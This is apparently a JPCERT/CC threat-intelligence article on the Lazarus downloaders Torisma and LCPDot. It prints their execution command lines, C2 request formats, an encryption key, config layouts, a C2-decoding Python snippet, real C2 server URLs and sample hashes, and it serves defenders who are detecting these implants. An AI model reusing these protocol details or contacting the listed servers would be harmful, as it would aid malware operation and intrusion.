In this article, we\npresent two more; Torisma and LCPDot.\n\n### Torisma overview\n\nTorisma downloads and executes modules from external servers, and its infection spreads\nvia malicious Word files [1]. Torisma samples that JPCERT/CC has analysed are DLL files\nand executed as an argument of rundll32.exe. Below is an example of a command argument\nfor Torisma execution.\n```\n\"C:\\Windows\\System32\\rundll32.exe\"\nC:\\ProgramData\\USOShared\\usosqlite3.dat,sqlite3_create_functionex\nmssqlite3_server_management jp-JP\n\n```\nBy giving a key to decode internal data (mssqlite3_server_management) to export function\n(\"sqlite3_create_functionex\" in this example), the malware performs suspicious functions .\nTorisma's configuration, communication protocol and modules are described in the following\nsections.\n\n### Torisma configuration\n\nTorisma loads C2 servers and other information from a separate file, which is located in the\nfollowing directory: (Some samples do not load configuration files.)\n\n％LOCALAPPDATA％.IdentityService\\AccountStore.bak\n\n\n-----\n\nThe configuration file has a 12-byte signature (0x98 0x11 0x1A 0x45 0x90 0x78 0xBA 0xF9\n0x4E 0xD6 0x8F 0xEE) at the beginning. File contents will be loaded upon execution only if\nthe signature matches the above value. Figure 1 is a sample of the configuration.\n\nFigure 1: Torisma\n\nconfiguration sample\nThe configuration file contains C2 server and other information. (See Appendix A for details.)\n\n### Torisma communication with C2 servers\n\nBelow is an example of a HTTP POST request that Torisma sends at the beginning of the\ncommunication.\n\n\n-----\n\n```\nPOST /[PATH] HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nAccept: */*\nConnection: Keep-Alive\nContent-Length: [Length]\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64;\nTrident/7.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media\nCenter PC 6.0; InfoPath.3)\nHost: [Server]\nCache-Control: no-cache\nACTION=VIEW&PAGE=[MAC Address]&CODE=[random numeric]&CACHE=[Base64 data]REQUEST=\n[random numeric]\n\n```\n[Base64 data] contains a C2 server URL, MAC address and other information. (Please see\nAppendix B for the details of the data format.) If the following input is received as a response\nto the HTTP POST request, Torisma sends the second request.\n```\nYour request has been accepted. ClientID: {f9102bc8a7d81ef01ba}\n\n```\nThis is the second HTTP POST request.\n```\nPOST /[PATH] HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nAccept: */*\nConnection: Keep-Alive\nContent-Length: [Length]\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64;\nTrident/7.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media\nCenter PC 6.0; InfoPath.3)\nHost: [Server]\nCache-Control: no-cache\nACTION=PREVPAGE&CODE=C[random numeric]&RES=[random numeric]\n\n```\nAs a response to this request, an encrypted and Base64-encoded module (\"+\" is replaced by\na space ) is downloaded. Torisma uses VEST-32 algorithm [2] for encryption. In the samples\nconfirmed by JPCERT/CC, the encryption key was identical, which was\n\"ff7172d9c888b7a88a7d77372112d772\" (as in Figure 2). This encryption algorithm is also\nused for encrypting C2 server information in the configuration.\n\n\n-----\n\nFigure 2: Torisma's\n\nVEST-32 encryption key\n\n### Torisma modules\n\nTorisma performs various functions by downloading and executing additional modules. They\nare provided in the executable code format as in Figure 3, not PE format.\n\nFigure 3: Torisma\n\nmodule code sample\nJPCERT/CC has confirmed a couple of module functions actually used in attacks:\n\nSend information of infected hosts\nExecute specific files\n\n### LCPDot overview\n\n\n-----\n\nLCPDot is also a downloader similar to Torisma. In some samples, the code was obfuscated\nby VMProtect. It is assumed that attacker used LCPDot for lateral movement on a victim's\nnetwork infected with Torisma. Samples analysed by JPCERT/CC perform suspicious\nbehaviour with the following options added upon execution:\n\n-p: RC4 encryption key\n-s: Base64-encoded C2 server information\n\nBelow is an example of an execution command with a specific option.\n```\n\"C:\\Windows\\System32\\cmd.exe\" /c C:\\ProgramData\\Adobe\\Adobe.bin -p 0x53A4C60B\n\n```\nThe following sections describe LCPDot configuration and communication protocol.\n\n### LCPDot communication with C2 servers\n\nBelow is an example of a HTTP POST request that LCPDot sends at the beginning of the\ncommunication.\n```\nPOST /[URL] HTTP/1.1\nAccept: text/html\nAccept-Language: en-us\nContent-Type: application/x-www-form-urlencoded\nCookie: SESSID=[Base64 data]\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko\nHost: [Host]\nContent-Length: [Size]\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie=Enable&CookieV=[random numeric]&Cookie_Time=64\n\n```\n[Base64 data] contains the encoded value of “[ID]-101010”. ([ID] is a unique value for the\nentire communication. ) If the following input is received as a response to this request,\nLCPDot sends the second request.\n```\nAuthentication Success\n\n```\nThis is the second HTTP POST request.\n```\nGET /[URL] HTTP/1.1\nAccept: text/html\nAccept-Language: en-us\nContent-Type: application/x-www-form-urlencoded\nCookie: SESSID=[Base64 data]\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko\nHost: [Host]\nContent-Length: [Size]\nConnection: Keep-Alive\nCache-Control: no-cache\n\n```\n\n-----\n\n[Base64 data] contains the encoded value of [ID]-101011 . As a response to this request, a\nRC4-encoded module is downloaded. The encryption key is the SHA1 hash value of the\nvalue specified either in the sample or in the option \"-p\" upon execution.\nThe function of the module is unknown as no module could be obtained during the analysis.\nIt was at least confirmed that it includes functions to disguise the data as a GIF image\n(Figure 4).\n\nFigure 4: Code to\n\ndisguise data that LCPDot sends as GIF image\n\n### LCPDot configuration\n\nLCPDot contains its configuration in itself. (In some samples, the configuration needs to be\nspecified with the option \"-s\" when executed.) C2 server information is encoded with\nXOR+Base64. Below is an example of Python script to decode the C2 server information.\n```\ndecoed_base64_data = base64.b64decode(encode_data)\nfor i in decoed_base64_data:\n  print chr(((ord(i) ^ 0x25) - 0x7a))\n\n```\nLCPDot saves configuration data including C2 servers in a separate file. There are some\npatterns in the location of the file, such as:\n\n%TEMP%¥..¥Thumbnails.db\n%TEMP%¥..¥ntuser.log1\n\nThe configuration data is RC4-encrypted. The encryption key is the SHA1 hash value of the\nvalue specified either in the sample or in option “-p” upon execution. Figure 5 is an example\nof decoded configuration.\n\n\n-----\n\nFigure 5: Example of\n\ndecoded configuration\n\n### In closing\n\nThis article provided details of malware that Lazarus group uses during and after the\nintrusion. To date, this group has used various kinds of malware besides the two covered in\nthis article. We will provide an update when we find new types of malware.\n\nC2 servers connected to the samples described in this article are listed in Appendix C.\nPlease make sure that none of your devices is communicating with them.\n\nShusei Tomonaga\n\n(Translated by Yukako Uchida)\n\n**Reference**\n\n[1] McAfee: Operation North Star: Behind The Scenes\n\nhttps://www.mcafee.com/blogs/other-blogs/mcafee-labs/operation-north-star-behind-thescenes/\n\n[2] ECRYPT: VEST\n\n[https://www.ecrypt.eu.org/stream/vest.html](https://www.ecrypt.eu.org/stream/vest.html)\n\n**Appendix A: Torisma configuration**\n\nTable A: List of configuration\n\nOffset Description Remarks\n\n0x000 Signature 0x98 0x11 0x1A 0x45 0x90 0x78 0xBA 0xF9 0x4E 0xD6 0x8F\n0xEE\n\n0x00d Time\n\n0x011 \n\n-----\n\n0x015 Drive check\ntime\n\n0x01D Sleep time\n\n0x021 C2 server * 6 Size 0x202 (VEST-32 encrypted)\n\n\n0xC2D C2 server size *\n6\n\n\nSize 0x4\n\n\n0xC45 Disc drive flag Whether to count the number of disc drives\n\n0xC49 WTSActive flag Whether to count the number of logon users\n\n0xC4D ID\n\n**Appendix B: Data sent by Torisma**\n\nTable B: Format of data sent\n\nOffset Length Contents\n\n0x000 0x400 URL\n\n0x400 0x18 MAC address of infected host\n\n0x418 0xC Random string\n\n0x424 8 ID\n\n0x434 4 Numeric value\n\n0x438 4 \"2\"\n\n**Appendix C: C2 servers**\n\nhttps://www.commodore.com.tr/mobiquo/appExtt/notdefteri/writenote.php\nhttps://www.fabianiarte.com/newsletter/arte/view.asp\nhttps://www.scimpex.com/admin/assets/backup/requisition/requisition.php\nhttps://akramportal.org/public/voice/voice.php\nhttps://inovecommerce.com.br/public/pdf/view.php\nhttps://www.index-consulting.jp:443/eng/news/index.php\nhttp://kenpa.org/yokohama/main.php\nhttps://vega.mh-tec.jp:443/.well-known/index.php\nhttp://www.hirokawaunso.co.jp/wordpress/wp-includes/ID3/module.audio.mp4.php\nhttps://ja-fc.or.jp/shop/shopping.php\nhttps://www.leemble.com/5mai-lyon/public/webconf.php\nhttps://www.tronslog.com/public/appstore.php\n\n\n-----\n\nhttps://mail.clicktocareers.com/dev_clicktocareers/public/mailview.php\n\n**Appendix D: Malware hash value**\n\nTorisma\n\n9ae9ed06a69baa24e3a539d9ce32c437a6bdc136ce4367b1cb603e728f4279d5\nf77a9875dbf1a1807082117d69bdbdd14eaa112996962f613de4204db34faba7\n7762ba7ae989d47446da21cd04fd6fb92484dd07d078c7385ded459dedc726f9\n\nLCPDot\n\n0c69fd9be0cc9fadacff2c0bacf59dab6d935b02b5b8d2c9cb049e9545bb55ce\na9334efa9f40a36e7dde7ef1fe3018b2410cd9de80d98cf4e3bb5dd7c78f7fde\nba57f8fcb28b7d1085e2e5e24bf2a463f0fa4bbbeb3f634e5a122d0b8dbb53cc\n\n[Email](http://10.10.0.46/mailto:?subject=Operation%20Dream%20Job%20by%20Lazarus&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fen%2F2021%2F01%2FLazarus_malware2.html)\n\nAuthor\n\n朝長 [秀誠 (Shusei Tomonaga)](https://blogs.jpcert.or.jp/en/shu_tom/)\n\nSince December 2012, he has been engaged in malware analysis and forensics\ninvestigation, and is especially involved in analyzing incidents of targeted attacks.
